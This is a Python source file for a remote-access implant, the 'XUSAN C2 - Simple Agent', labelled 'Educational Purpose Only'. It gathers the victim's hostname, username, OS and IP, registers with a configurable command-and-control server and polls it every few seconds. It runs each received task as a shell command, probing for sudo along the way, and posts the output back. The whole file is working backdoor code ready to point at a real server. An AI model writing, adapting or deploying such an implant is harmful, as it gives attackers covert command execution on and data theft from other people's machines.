#!/usr/bin/env python3
"""
🎯 XUSAN C2 - Simple Agent
Educational Purpose Only
"""

import requests
import platform
import getpass
import socket
import time
import subprocess
import uuid
import os
import sys

# ==================== CONFIG ====================
SERVER = "http://127.0.0.1:5000"  # Change this to your server
INTERVAL = 3  # Check every 3 seconds

def get_info():
    """Get system info"""
    info = {
        'hostname': socket.gethostname(),
        'user': getpass.getuser(),
        'os': platform.system(),
        'ip': '127.0.0.1'
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['ip'] = s.getsockname()[0]
        s.close()
    except:
        pass
    return info

def run_command(cmd):
    """Execute shell command"""
    try:
        import platform, os, subprocess
        # Special handling for 'cd' command
        if cmd.strip() == 'clear':
            return '[CLEAR_SCREEN]'
        # Sudo password prompt detection
        if cmd.strip().startswith('sudo '):
            # Try to run with empty password to detect prompt
            import subprocess
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, input='\n', timeout=10)
                if 'password for' in result.stderr.lower() or 'password:' in result.stderr.lower():
                    return '[SUDO_PROMPT]'
                return result.stdout if result.stdout else result.stderr
            except Exception as e:
                return str(e)
        if cmd.strip().startswith('cd '):
            path = cmd.strip()[3:].strip()
            try:
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}"
            except Exception as e:
                return f"cd error: {e}"
        # Use 'pty' for better shell emulation (for clear, etc.)
        if platform.system() != 'Windows':
            import pty, shlex
            master, slave = pty.openpty()
            proc = subprocess.Popen(shlex.split(cmd), stdin=None, stdout=slave, stderr=slave, text=True)
            os.close(slave)
            output = b''
            while True:
                try:
                    data = os.read(master, 1024)
                    if not data:
                        break
                    output += data
                except OSError:
                    break
            os.close(master)
            return output.decode(errors='replace')
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

def main():
    server = SERVER
    if len(sys.argv) > 1:
        server = sys.argv[1]
    
    agent_id = str(uuid.uuid4())[:8]
    
    # Register
    try:
        r = requests.post(f"{server}/api/beacon/register", json={
            'agent_id': agent_id,
            'info': get_info()
        }, timeout=10)
        print(f"[+] Registered: {agent_id}")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        return
    
    # Main loop
    while True:
        try:
            # Heartbeat
            r = requests.post(f"{server}/api/beacon/heartbeat", 
                            json={'agent_id': agent_id}, timeout=10)
            data = r.json()
            
            # Execute tasks
            for task in data.get('tasks', []):
                cmd = task.get('data', '')
                result = run_command(cmd)
                
                # Send result
                requests.post(f"{server}/api/beacon/result", json={
                    'agent_id': agent_id,
                    'task_id': task.get('task_id'),
                    'result': result
                }, timeout=10)
            
            time.sleep(INTERVAL)
            
        except KeyboardInterrupt:
            break
        except:
            time.sleep(5)

if __name__ == '__main__':
    main()
